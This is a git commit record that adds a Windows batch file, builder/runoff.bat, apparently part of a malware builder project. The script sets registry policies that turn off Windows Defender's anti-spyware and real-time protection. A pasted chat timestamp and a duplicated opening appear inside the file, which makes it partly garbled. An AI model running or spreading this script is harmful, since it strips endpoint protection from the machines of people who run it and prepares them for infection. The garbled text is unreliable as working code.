513641015605304a8eabc9589d1e5681b26a136c
Encode-Hub <f1ku3@proton.me>
2024-07-01 14:17:56 +0800

    Add files via upload

---
+++ builder/runoff.bat
@@ -0,0 +1,10 @@
+@echo off
+echo Disabling Windows Defender...
+
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+
+echo Windows Defender has been disabled.
+[5:24 PM]
+@echo off
+echo Disabling Windows Defender...
